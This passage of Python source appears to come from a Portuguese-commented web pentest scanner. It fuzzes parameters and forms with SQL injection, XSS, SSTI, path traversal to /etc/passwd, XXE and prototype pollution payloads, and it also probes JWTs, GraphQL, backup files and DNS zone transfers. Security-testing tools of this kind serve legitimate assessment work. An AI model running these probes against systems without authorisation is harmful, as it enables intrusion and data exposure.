                'Implementar prepared statements e parameterized queries',
                'Validar e sanitizar todas as entradas do usuário',
                'Utilizar ORM com proteção contra SQLi'
            ],
            'XSS': [
                'Implementar Content Security Policy (CSP)',
                'Codificar saídas (output encoding)',
                'Validar e sanitizar todas as entradas'
            ],
            'Command Injection': [
                'Evitar chamadas de sistema shell',
                'Utilizar APIs seguras em vez de execução de comandos',
                'Validar estritamente todas as entradas'
            ],
            'File Inclusion': [
                'Validar e sanitizar entradas de arquivos',
                'Utilizar lista branca de arquivos permitidos',
                'Desativar include_path no PHP se não necessário'
            ]
        }
        
        # Adiciona recomendações baseadas nas vulnerabilidades encontradas
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            for key in vuln_recommendations:
                if key in vuln_type:
                    recommendations.extend(vuln_recommendations[key])
        
        # Recomendações gerais
        general_recommendations = [
            'Implementar autenticação multi-fator (MFA)',
            'Manter todos os sistemas e dependências atualizados',
            'Realizar pentests regulares',
            'Implementar monitoramento e logging centralizado',
            'Configurar WAF (Web Application Firewall)',
            'Implementar rate limiting',
            'Utilizar HTTPS em todas as páginas',
            'Configurar cabeçalhos de segurança (HSTS, CSP, etc.)'
        ]
        
        recommendations.extend(general_recommendations)
        
        # Remove duplicatas
        recommendations = list(dict.fromkeys(recommendations))
        
        return recommendations[:20]  # Limita a 20 recomendações
    
    # ==================== UTILITÁRIOS ====================
    
    def extract_forms(self, html):
        """Extrai formulários da página"""
        forms = []
        soup = BeautifulSoup(html, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').upper(),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                if input_tag.name == 'textarea':
                    input_data['value'] = input_tag.get_text()
                elif input_tag.name == 'select':
                    options = []
                    for option in input_tag.find_all('option'):
                        options.append({
                            'value': option.get('value', ''),
                            'text': option.get_text()
                        })
                    input_data['options'] = options
                
                form_data['inputs'].append(input_data)
            
            forms.append(form_data)
        
        return forms
    
    def extract_all_forms(self):
        """Extrai todos os formulários do site"""
        forms = []
        
        # Páginas principais para verificar
        endpoints = ['', '/contact', '/login', '/register', '/search', '/admin', '/dashboard']
        
        for endpoint in endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                response = self.session.get(url, timeout=5, verify=False)
                forms.extend(self.extract_forms(response.text))
            except:
                continue
        
        return forms
    
    def extract_links(self, html):
        """Extrai links da página"""
        links = set()
        soup = BeautifulSoup(html, 'html.parser')
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(self.target_url, href)
            if self.base_domain in full_url:
                links.add(full_url)
        
        return list(links)
    
    def extract_title(self, html):
        """Extrai título da página"""
        soup = BeautifulSoup(html, 'html.parser')
        title = soup.title
        return title.string if title else "No title"
    
    def detect_technologies(self, response):
        """Detecta tecnologias usadas no site"""
        technologies = []
        headers = response.headers
        
        # Detecta por headers
        if 'Server' in headers:
            technologies.append(f"Server: {headers['Server']}")
        if 'X-Powered-By' in headers:
            technologies.append(f"Powered by: {headers['X-Powered-By']}")
        
        # Detecta por conteúdo
        content = response.text.lower()
        
        tech_patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Joomla': ['joomla', 'media/jui/', 'com_content'],
            'Drupal': ['drupal', 'sites/all/'],
            'Laravel': ['laravel', '/storage/'],
            'React': ['react', 'react-dom'],
            'Vue.js': ['vue', 'vue.js'],
            'Angular': ['angular', 'ng-'],
            'jQuery': ['jquery'],
            'Bootstrap': ['bootstrap'],
            'PHP': ['.php', 'php/'],
            'ASP.NET': ['.aspx', '__viewstate'],
            'Java': ['jsp', 'jsessionid'],
            'Ruby': ['.rb', 'rails'],
            'Python': ['django', 'flask', 'python']
        }
        
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in content:
                    technologies.append(tech)
                    break
        
        return list(set(technologies))
    
    def add_vulnerability(self, vuln):
        """Adiciona vulnerabilidade à lista com persistência e armazenamento de evidências"""
        # Garantir timestamp
        vuln.setdefault('timestamp', datetime.now().isoformat())
        # ID único baseado no tipo/url/evidence
        unique_str = f"{vuln.get('type','')}-{vuln.get('url','')}-{vuln.get('evidence','')}"
        vid = hashlib.sha256(unique_str.encode()).hexdigest()
        if vid in self.vuln_ids:
            return
        vuln['id'] = vid
        self.vuln_ids.add(vid)
        # Salva evidência bruta se disponível
        evidence_text = vuln.get('response_text') or vuln.get('evidence') or ''
        evidence_dir = f"{self.output_dir}/loot/vuln_evidence"
        os.makedirs(evidence_dir, exist_ok=True)
        if evidence_text:
            try:
                with open(os.path.join(evidence_dir, f"{vid}.txt"), 'w', encoding='utf-8') as ef:
                    ef.write(evidence_text)
            except Exception as e:
                self.logger.debug(f"Erro ao salvar arquivo de evidência: {e}")
        # Adiciona à lista
        self.vulnerabilities.append(vuln)
        # Persiste no banco
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute("INSERT INTO vulnerabilities (id,type,severity,url,method,payload,evidence,timestamp,data) VALUES (?,?,?,?,?,?,?,?,?)",
                        (vid, vuln.get('type'), vuln.get('severity'), vuln.get('url'), vuln.get('method'), vuln.get('payload'), vuln.get('evidence'), vuln.get('timestamp'), json.dumps(vuln)))
            conn.commit()
            conn.close()
        except Exception as e:
            self.logger.debug(f"Erro ao persistir vuln no DB: {e}")
        # Log colorido baseado na severidade
        severity_colors = {
            'CRITICAL': Fore.RED + Style.BRIGHT,
            'HIGH': Fore.RED,
            'MEDIUM': Fore.YELLOW,
            'LOW': Fore.GREEN
        }
        color = severity_colors.get(vuln['severity'], Fore.WHITE)
        self.logger.warning(f"{color}[!] {vuln['type']} ({vuln['severity']}) encontrado em {vuln.get('url', 'N/A')}{Style.RESET_ALL}")
    
    def save_json(self, data, filename):
        """Salva dados em JSON"""
        path = f"{self.output_dir}/scans/{filename}"
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, default=str)
    
    def save_list(self, data_list, filename):
        """Salva lista em arquivo"""
        path = f"{self.output_dir}/loot/{filename}"
        with open(path, 'w', encoding='utf-8') as f:
            for item in data_list:
                f.write(f"{item}\n")

    def _init_db(self):
        """Inicializa banco sqlite para vulnerabilidades"""
        try:
            conn = sqlite3.connect(self.db_path)
            cur = conn.cursor()
            cur.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
                id TEXT PRIMARY KEY,
                type TEXT,
                severity TEXT,
                url TEXT,
                method TEXT,
                payload TEXT,
                evidence TEXT,
                timestamp TEXT,
                data JSON
            )''')
            conn.commit()
            cur.execute("SELECT id FROM vulnerabilities")
            rows = cur.fetchall()
            self.vuln_ids = set(r[0] for r in rows)
            conn.close()
        except Exception as e:
            self.logger.debug(f"Erro ao inicializar DB: {e}")

    def export_vulns_csv(self, filename=None):
        """Exporta vulnerabilidades para CSV"""
        if not filename:
            filename = f"vulnerabilities_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        path = f"{self.output_dir}/reports/{filename}"
        keys = ['id','type','severity','url','method','payload','evidence','timestamp']
        with open(path, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=keys)
            writer.writeheader()
            for v in self.vulnerabilities:
                row = {k: v.get(k, '') for k in keys}
                writer.writerow(row)
        print(f"{Fore.GREEN}[+] CSV exportado: {path}{Style.RESET_ALL}")
        return path

    def send_report_via_email(self, smtp_server, smtp_port, username, password, from_addr, to_addrs, subject=None):
        """Envia relatório por email (apaga anexos automaticamente)"""
        try:
            msg = f"Subject: {subject or 'Pentest Report'}\n\nRelatório gerado para {self.target_url}. Anexos são os relatórios HTML/JSON no diretório {self.output_dir}/reports"
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            server.starttls()
            server.login(username, password)
            server.sendmail(from_addr, to_addrs if isinstance(to_addrs, list) else [to_addrs], msg.encode('utf-8'))
            server.quit()
            print(f"{Fore.GREEN}[+] Email enviado para {to_addrs}{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Falha ao enviar email: {e}{Style.RESET_ALL}")
            return False

    def shodan_lookup(self, api_key_env='SHODAN_API_KEY'):
        """Consulta informações no Shodan (se API key disponível via env)"""
        api_key = os.environ.get(api_key_env)
        if not api_key:
            print(f"{Fore.YELLOW}[!] SHODAN API key não encontrada em env var {api_key_env}{Style.RESET_ALL}")
            return None
        try:
            hostname = self.parsed_url.hostname
            ip = socket.gethostbyname(hostname)
            url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                self.save_json(data, 'shodan_lookup.json')
                print(f"{Fore.GREEN}[+] Shodan data salvo em {self.output_dir}/scans/shodan_lookup.json{Style.RESET_ALL}")
                return data
            else:
                print(f"{Fore.YELLOW}[!] Shodan returned status {r.status_code}{Style.RESET_ALL}")
                return None
        except Exception as e:
            print(f"{Fore.RED}[!] Erro no Shodan lookup: {e}{Style.RESET_ALL}")
            return None

    def authenticate_via_form(self, login_url, username_field, password_field, username, password, submit_field=None, method='POST'):
        """Tenta autenticar via formulário e preserva sessão"""
        try:
            r = self.session.get(login_url, timeout=10, verify=False)
            forms = self.extract_forms(r.text)
            target_form = None
            for form in forms:
                if username_field in ''.join(i['name'] for i in form['inputs']):
                    target_form = form
                    break
            if not target_form:
                # fallback: build payload directly
                action = login_url
                form_method = method
                data = {username_field: username, password_field: password}
            else:
                action = urljoin(login_url, target_form.get('action') or '')
                form_method = target_form.get('method', 'POST')
                data = {}
                for inp in target_form['inputs']:
                    name = inp.get('name')
                    if not name:
                        continue
                    if name == username_field:
                        data[name] = username
                    elif name == password_field:
                        data[name] = password
                    elif submit_field and name == submit_field:
                        data[name] = inp.get('value', '')
                    else:
                        data[name] = inp.get('value', '')

            if form_method.upper() == 'GET':
                resp = self.session.get(action, params=data, timeout=10, verify=False)
            else:
                resp = self.session.post(action, data=data, timeout=10, verify=False)

            # heurística simples para sucesso: 200 + ausência da palavra 'login' ou presença do username
            if resp.status_code in [200,302] and (username in resp.text or 'logout' in resp.text.lower() or 'profile' in resp.text.lower()):
                # salva cookies
                try:
                    from requests.utils import dict_from_cookiejar
                    ck = dict_from_cookiejar(self.session.cookies)
                    with open(f"{self.output_dir}/loot/auth_cookies.txt", 'w', encoding='utf-8') as f:
                        json.dump(ck, f, indent=2)
                except:
                    pass
                print(f"{Fore.GREEN}[+] Autenticação aparentemente bem sucedida{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.YELLOW}[!] Falha na autenticação (status {resp.status_code}){Style.RESET_ALL}")
                return False
        except Exception as e:
            self.logger.debug(f"Erro em authenticate_via_form: {e}")
            return False

    def js_render_crawl(self, max_pages=50):
        """Renderiza páginas com Playwright (quando disponível) e detecta sinks de DOM/XSS"""
        findings = []
        if not self.playwright_available:
            print(f"{Fore.YELLOW}[!] Playwright não disponível, realizando crawl simples{Style.RESET_ALL}")
            return self.crawl_website(max_pages)

        try:
            pages = self.crawl_website(max_pages)
            from playwright.sync_api import sync_playwright
            data = {}
            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True)
                context = browser.new_context()
                page = context.new_page()
                for url in pages[:max_pages]:
                    try:
                        page.goto(url, timeout=15000)
                        content = page.content()
                        data[url] = content[:10000]

                        # simple DOM sink heuristics
                        sinks = []
                        if 'document.write' in content or 'innerHTML' in content or 'outerHTML' in content or 'eval(' in content:
                            sinks.append('Potential DOM sink found (document.write/innerHTML/eval)')

                        # check inline event handlers
                        if re.search(r'on\w+=\"', content):
                            sinks.append('Inline event handlers present (on*)')

                        if sinks:
                            findings.append({'url': url, 'sinks': sinks})

                    except Exception as e:
                        self.logger.debug(f"Erro ao renderizar {url}: {e}")
                        continue
                browser.close()
            self.save_json(data, 'js_rendered_pages.json')
            if findings:
                print(f"{Fore.YELLOW}[!] Possíveis sinks DOM detectados: {len(findings)} páginas{Style.RESET_ALL}")
                self.save_json(findings, 'dom_sinks.json')
            else:
                print(f"{Fore.GREEN}[+] Rendimento JS concluído sem sinks aparentes{Style.RESET_ALL}")
            return findings
        except Exception as e:
            self.logger.error(f"Erro no js_render_crawl: {e}")
            return []

    def fuzz_parameters(self, urls=None, payloads=None, max_tests=1000, timeout=7):
        """Fuzz de parâmetros com payloads comuns (SQLi timing, XSS, SSTI, LFI)"""
        if not urls:
            crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
            if os.path.exists(crawled_file):
                with open(crawled_file, 'r') as f:
                    urls = [line.strip() for line in f.readlines()]
            else:
                urls = [self.target_url]

        default_payloads = ["' OR '1'='1' --", "<script>alert('XSS')</script>", "{{7*7}}", "../../../../etc/passwd", "'||sleep(5)--"]
        payloads = payloads or default_payloads

        tests = 0
        for url in urls:
            if tests >= max_tests:
                break
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            if not qs:
                continue
            for param in qs:
                for p in payloads:
                    if tests >= max_tests:
                        break
                    tests += 1
                    try:
                        start = time.time()
                        test_qs = parsed.query.replace(param + '=' + qs[param][0], param + '=' + quote(p))
                        test_url = parsed._replace(query=test_qs).geturl()
                        r = self.session.get(test_url, timeout=timeout, verify=False)
                        elapsed = time.time() - start

                        # Reflected payload
                        if p in r.text or (p.replace("%","") in r.text):
                            self.add_vulnerability({'type': 'Parameter Reflection', 'severity': 'MEDIUM', 'url': test_url, 'payload': p, 'evidence': 'Payload reflected in response', 'response_text': r.text})

                        # SQLi timing
                        if 'sleep' in p.lower() and elapsed > 4.5:
                            self.add_vulnerability({'type': 'Blind SQLi (time-based)', 'severity': 'HIGH', 'url': test_url, 'payload': p, 'evidence': f'Response delay: {elapsed:.2f}s', 'response_time': elapsed})

                        # SSTI simple check
                        if '{{7*7}}' in p and '49' in r.text:
                            self.add_vulnerability({'type': 'SSTI', 'severity': 'HIGH', 'url': test_url, 'payload': p, 'evidence': 'Server evaluated template expression (49 found)', 'response_text': r.text})

                        # LFI check
                        if 'etc/passwd' in p and ('root:' in r.text or 'daemon:' in r.text):
                            self.add_vulnerability({'type': 'Local File Inclusion', 'severity': 'HIGH', 'url': test_url, 'payload': p, 'evidence': 'Contents of /etc/passwd', 'response_text': r.text})

                    except Exception as e:
                        self.logger.debug(f"Erro no fuzz parameter {url} param {param} payload {p}: {e}")
                        continue
        print(f"{Fore.GREEN}[+] Fuzzing concluído ({tests} testes){Style.RESET_ALL}")
        return True

    def check_ssti(self):
        """Verifica SSTI em formulários e parâmetros"""
        payloads = ['{{7*7}}', '{%7B7*7%7D%7D', "${{7*7}}", "{{7*7}}%0A"]
        forms = self.extract_all_forms()
        for form in forms:
            for p in payloads:
                data = {}
                for inp in form['inputs']:
                    name = inp.get('name')
                    if not name:
                        continue
                    data[name] = p
                try:
                    if form['method'].upper() == 'GET':
                        r = self.session.get(form['action'], params=data, timeout=7, verify=False)
                    else:
                        r = self.session.post(form['action'], data=data, timeout=7, verify=False)
                    if '49' in r.text:
                        self.add_vulnerability({'type': 'SSTI', 'severity': 'HIGH', 'url': form['action'], 'payload': p, 'evidence': 'Template evaluated (49)', 'response_text': r.text})
                except Exception as e:
                    continue
        print(f"{Fore.GREEN}[+] SSTI check concluído{Style.RESET_ALL}")
        return True

    def check_jwt_tokens(self):
        """Procura tokens JWT e verifica configurações inseguras"""
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file,'r') as f:
                urls = [line.strip() for line in f.readlines()][:200]
        else:
            urls = [self.target_url]

        jwt_pattern = r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                for match in re.findall(jwt_pattern, r.text):
                    try:
                        payload = jwt.decode(match, options={"verify_signature": False})
                        header = jwt.get_unverified_header(match)
                        issues = []
                        if header.get('alg', '').lower() == 'none':
                            issues.append('alg=none (no signature)')
                        if 'exp' not in payload:
                            issues.append('missing exp claim')
                        if issues:
                            self.add_vulnerability({'type': 'JWT Misconfiguration', 'severity': 'HIGH', 'url': url, 'evidence': '; '.join(issues), 'token_payload': payload})
                    except Exception as e:
                        self.logger.debug(f"Erro ao analisar JWT: {e}")
            except Exception:
                continue
        print(f"{Fore.GREEN}[+] JWT checks concluídos{Style.RESET_ALL}")
        return True

    def check_graphql(self):
        """Tenta detectar GraphQL e fazer introspection"""
        graphql_endpoints = ['/graphql', '/api/graphql', '/graphql/', '/api/graphql/', '/v1/graphql', '/gql']
        found = []
        
        for endpoint in graphql_endpoints:
            test_url = urljoin(self.target_url, endpoint)
            introspection_query = '{"query":"query{__schema{types{name}}}"}'
            
            try:
                r = self.session.post(test_url, json=json.loads(introspection_query), timeout=7, verify=False)
                if r.status_code == 200 and '__schema' in r.text:
                    found.append(test_url)
                    print(f"{Fore.YELLOW}[!] GraphQL encontrado em {endpoint}{Style.RESET_ALL}")
                    # Tenta fazer introspection completo
                    try:
                        full_introspection = '{"query":"query{__schema{queryType{fields{name type{kind}}}mutationType{fields{name}}}}"}'
                        r2 = self.session.post(test_url, json=json.loads(full_introspection), timeout=7, verify=False)
                        self.save_json(r2.json(), 'graphql_introspection.json')
                    except:
                        pass
            except Exception as e:
                self.logger.debug(f"Erro ao testar GraphQL em {endpoint}: {e}")
        
        if found:
            self.add_vulnerability({'type': 'GraphQL Introspection Enabled', 'severity': 'MEDIUM', 'url': found[0], 'evidence': f'Encontrados {len(found)} endpoints GraphQL', 'response_text': 'Introspection habilitada'})
        
        print(f"{Fore.GREEN}[+] GraphQL check concluído{Style.RESET_ALL}")
        return found

    def find_backup_files(self):
        """Procura por arquivos de backup comuns (.bak, .swp, ~, .env.bak, etc)"""
        backup_patterns = [
            '.bak', '.backup', '~', '.swp', '.swo', '.tmp',
            '.old', '.orig', '.copy', '.dist', '.git',
            '.env.bak', '.env.backup', '.env.local',
            'config.bak', 'config.backup', 'database.bak',
            '.DS_Store', 'thumbs.db', '.vscode',
            'package-lock.json', 'composer.lock', 'requirements.txt'
        ]
        
        found = []
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:100]
        else:
            urls = [self.target_url]
        
        for url in urls:
            for pattern in backup_patterns:
                test_url = url + pattern
                try:
                    r = self.session.head(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 403]:
                        found.append(test_url)
                        self.add_vulnerability({'type': 'Backup/Sensitive File', 'severity': 'HIGH', 'url': test_url, 'evidence': f'Arquivo encontrado: {pattern}', 'status_code': r.status_code})
                        print(f"{Fore.YELLOW}[!] Arquivo encontrado: {test_url}{Style.RESET_ALL}")
                except Exception as e:
                    self.logger.debug(f"Erro ao procurar {test_url}: {e}")
        
        if found:
            self.save_list(found, 'backup_files.txt')
        print(f"{Fore.GREEN}[+] Backup files check concluído ({len(found)} encontrados){Style.RESET_ALL}")
        return found

    def detect_cloud_services(self):
        """Detecta serviços cloud (AWS S3, Azure Blobs, GCP, etc)"""
        cloud_patterns = {
            'AWS S3': [r's3\.amazonaws\.com', r's3-\w+\.amazonaws\.com', r'\w+\.s3\.amazonaws\.com'],
            'Azure Blob': [r'\.blob\.core\.windows\.net', r'\.table\.core\.windows\.net', r'\.queue\.core\.windows\.net'],
            'GCP Storage': [r'storage\.googleapis\.com', r'\w+\.storage\.googleapis\.com'],
            'DigitalOcean Spaces': [r'\.digitaloceanspaces\.com'],
            'Cloudflare R2': [r'\.r2\.cloudflarestorage\.com'],
            'AWS CloudFront': [r'd[a-z0-9]+\.cloudfront\.net'],
        }
        
        found = {}
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:100]
        else:
            urls = [self.target_url]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                content = r.text + ' '.join(r.headers.values())
                
                for service, patterns in cloud_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            if service not in found:
                                found[service] = []
                            found[service].append(url)
            except Exception:
                continue
        
        if found:
            for service, urls_list in found.items():
                self.add_vulnerability({'type': f'Cloud Service Detected: {service}', 'severity': 'LOW', 'url': urls_list[0], 'evidence': f'{service} encontrado em {len(urls_list)} URLs'})
                print(f"{Fore.YELLOW}[!] {service} detectado{Style.RESET_ALL}")
            self.save_json(found, 'cloud_services.json')
        
        print(f"{Fore.GREEN}[+] Cloud services detection concluído{Style.RESET_ALL}")
        return found

    def analyze_source_maps(self):
        """Procura por source maps (.js.map, .css.map) expostos"""
        found = []
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:100]
        else:
            urls = [self.target_url]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                # Procura por source map references
                if re.search(r'sourceMappingURL|source-map|sourceMap', r.text):
                    maps = re.findall(r'sourceMappingURL=([^\s\'"]+)', r.text)
                    for map_file in maps:
                        map_url = urljoin(url, map_file)
                        try:
                            mr = self.session.get(map_url, timeout=3, verify=False)
                            if mr.status_code == 200:
                                found.append(map_url)
                                self.add_vulnerability({'type': 'Exposed Source Map', 'severity': 'MEDIUM', 'url': map_url, 'evidence': 'Source map file acessível', 'response_text': mr.text[:500]})
                                print(f"{Fore.YELLOW}[!] Source map encontrado: {map_url}{Style.RESET_ALL}")
                        except:
                            pass
            except Exception:
                continue
        
        if found:
            self.save_list(found, 'source_maps.txt')
        print(f"{Fore.GREEN}[+] Source map analysis concluído ({len(found)} encontrados){Style.RESET_ALL}")
        return found

    def harvest_comments(self):
        """Extrai comentários HTML, JS e CSS que possam ser sensíveis"""
        comments_found = {}
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:50]
        else:
            urls = [self.target_url]
        
        sensitive_keywords = ['TODO', 'FIXME', 'BUG', 'HACK', 'password', 'secret', 'key', 'token', 'api', 'debug', 'admin', 'test', 'dev', 'internal']
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                # HTML comments
                html_comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
                # JS comments
                js_comments = re.findall(r'//\s*(.+?)$', r.text, re.MULTILINE)
                # CSS comments
                css_comments = re.findall(r'/\*(.*?)\*/', r.text, re.DOTALL)
                
                all_comments = html_comments + js_comments + css_comments
                
                for comment in all_comments:
                    comment = comment.strip()
                    if any(kw.lower() in comment.lower() for kw in sensitive_keywords):
                        if url not in comments_found:
                            comments_found[url] = []
                        comments_found[url].append(comment[:200])
            except Exception:
                continue
        
        if comments_found:
            self.save_json(comments_found, 'code_comments.json')
            for url, comments in comments_found.items():
                self.add_vulnerability({'type': 'Sensitive Code Comments', 'severity': 'LOW', 'url': url, 'evidence': f'{len(comments)} comentários sensíveis encontrados', 'comments': comments[:5]})
        
        print(f"{Fore.GREEN}[+] Comment harvesting concluído ({len(comments_found)} URLs com comentários){Style.RESET_ALL}")
        return comments_found

    def check_xxe(self):
        """Testa XXE (XML External Entity) em formulários e endpoints"""
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''
        
        forms = self.extract_all_forms()
        for form in forms:
            # Testa se o form aceita XML
            try:
                if form['method'].upper() == 'POST':
                    # Envia payload XXE
                    headers = {'Content-Type': 'application/xml'}
                    r = self.session.post(form['action'], data=xxe_payload, headers=headers, timeout=7, verify=False)
                    
                    if 'root:' in r.text or 'daemon:' in r.text or 'bin:' in r.text:
                        self.add_vulnerability({'type': 'XXE Injection', 'severity': 'CRITICAL', 'url': form['action'], 'evidence': 'Arquivo local (passwd) foi lido via XXE', 'response_text': r.text})
                        print(f"{Fore.RED}[!] XXE CRÍTICO ENCONTRADO{Style.RESET_ALL}")
                    elif 'DOCTYPE' in r.text or 'ENTITY' in r.text:
                        self.add_vulnerability({'type': 'XXE (Blind)', 'severity': 'HIGH', 'url': form['action'], 'evidence': 'Sistema processou DOCTYPE/ENTITY'})
            except Exception as e:
                self.logger.debug(f"Erro ao testar XXE: {e}")
        
        print(f"{Fore.GREEN}[+] XXE check concluído{Style.RESET_ALL}")
        return True

    def check_prototype_pollution(self):
        """Testa Prototype Pollution em parâmetros"""
        pp_payloads = [
            {'__proto__': {'isAdmin': True}},
            {'constructor': {'prototype': {'isAdmin': True}}},
            {'__proto__[isAdmin]': True},
        ]
        
        test_url = f"{self.target_url}?__proto__[isAdmin]=true&constructor[prototype][isAdmin]=true"
        
        try:
            r = self.session.get(test_url, timeout=7, verify=False)
            if 'isAdmin' in r.text or 'admin' in r.text.lower():
                self.add_vulnerability({'type': 'Prototype Pollution', 'severity': 'HIGH', 'url': test_url, 'evidence': 'Parâmetro poluiu o protótipo de objeto', 'response_text': r.text})
                print(f"{Fore.RED}[!] PROTOTYPE POLLUTION ENCONTRADO{Style.RESET_ALL}")
        except Exception:
            pass
        
        # Testa em formulários
        forms = self.extract_all_forms()
        for form in forms:
            for payload in pp_payloads:
                try:
                    data = {}
                    for inp in form['inputs']:
                        name = inp.get('name')
                        if not name:
                            continue
                        data[name] = json.dumps(payload)
                    
                    if form['method'].upper() == 'POST':
                        r = self.session.post(form['action'], data=data, timeout=7, verify=False)
                    else:
                        r = self.session.get(form['action'], params=data, timeout=7, verify=False)
                    
                    if 'isAdmin' in r.text or 'true' in r.text:
                        self.add_vulnerability({'type': 'Prototype Pollution', 'severity': 'HIGH', 'url': form['action'], 'evidence': 'Poluição via form parameter', 'payload': json.dumps(payload)})
                except Exception:
                    continue
        
        print(f"{Fore.GREEN}[+] Prototype Pollution check concluído{Style.RESET_ALL}")
        return True

    def find_api_endpoints(self):
        """Mapeia endpoints de API comuns"""
        api_patterns = [
            '/api/', '/v1/', '/v2/', '/v3/',
            '/rest/', '/graphql', '/soap',
            '/swagger', '/openapi', '/api-docs',
            '/actuator', '/admin', '/manage'
        ]
        
        found_endpoints = []
        
        for pattern in api_patterns:
            test_url = urljoin(self.target_url, pattern)
            try:
                r = self.session.get(test_url, timeout=5, verify=False)
                if r.status_code in [200, 401, 403]:  # Endpoint existe
                    found_endpoints.append({'url': test_url, 'status': r.status_code})
                    print(f"{Fore.GREEN}[+] API endpoint encontrado: {pattern} ({r.status_code}){Style.RESET_ALL}")
                    
                    # Procura por Swagger/OpenAPI
                    if 'swagger' in r.text.lower() or 'openapi' in r.text.lower():
                        self.add_vulnerability({'type': 'API Documentation Exposed', 'severity': 'MEDIUM', 'url': test_url, 'evidence': 'Swagger/OpenAPI documentation acessível'})
            except Exception:
                continue
        
        if found_endpoints:
            self.save_json(found_endpoints, 'api_endpoints.json')
        print(f"{Fore.GREEN}[+] API endpoint mapping concluído ({len(found_endpoints)} encontrados){Style.RESET_ALL}")
        return found_endpoints

    def check_security_txt(self):
        """Procura por security.txt e policy.txt"""
        security_files = ['/.well-known/security.txt', '/security.txt', '/policy.txt', '/.well-known/policy.txt']
        
        found = []
        for file_path in security_files:
            test_url = urljoin(self.target_url, file_path)
            try:
                r = self.session.get(test_url, timeout=5, verify=False)
                if r.status_code == 200:
                    found.append({'url': test_url, 'content': r.text})
                    print(f"{Fore.GREEN}[+] {file_path} encontrado{Style.RESET_ALL}")
                    self.save_json(r.text, 'security_txt.json')
            except Exception:
                continue
        
        if found:
            print(f"{Fore.YELLOW}[!] Política de segurança encontrada - procure por contatos de divulgação responsável{Style.RESET_ALL}")
        else:
            self.add_vulnerability({'type': 'Missing security.txt', 'severity': 'LOW', 'url': self.target_url, 'evidence': 'security.txt não foi encontrado', 'recommendation': 'Implemente /.well-known/security.txt para política de segurança'})
        
        print(f"{Fore.GREEN}[+] Security.txt check concluído{Style.RESET_ALL}")
        return found

    def check_subdomains_active(self, subdomains):
        """Verifica quais subdomínios estão ativos"""
        active = set()
        
        def check(subdomain):
            try:
                # HTTP
                response = requests.get(f"http://{subdomain}", timeout=3, verify=False)
                if response.status_code < 400:
                    return subdomain
                
                # HTTPS
                response = requests.get(f"https://{subdomain}", timeout=3, verify=False)
                if response.status_code < 400:
                    return subdomain
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check, sub): sub for sub in subdomains}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    active.add(result)
        
        return active
    
    # ==================== MÉTODOS ADICIONAIS (esqueletos) ====================
    
    def dns_zone_transfer(self):
        """Tenta transferência de zona DNS"""
        # Implementação simplificada
        domain = self.base_domain.split(':')[0]
        try:
            resolver = dns.resolver.Resolver()
            ns_servers = resolver.resolve(domain, 'NS')
            
            for ns in ns_servers:
                ns_str = str(ns).rstrip('.')
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_str, domain))
                    if zone:
                        return [f"{name}.{domain}" for name in zone.nodes.keys()]
                except:
                    continue
        except:
            pass
        return set()
    
    def search_engines_subdomains(self):
        """Busca subdomínios em motores de busca"""
        # Implementação simplificada (em produção, usar APIs reais)
        return set()

# ==================== INTERFACE DE LINHA DE COMANDO ====================

def banner():
    """Exibe banner da ferramenta"""
    print(f"""{Fore.CYAN}
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
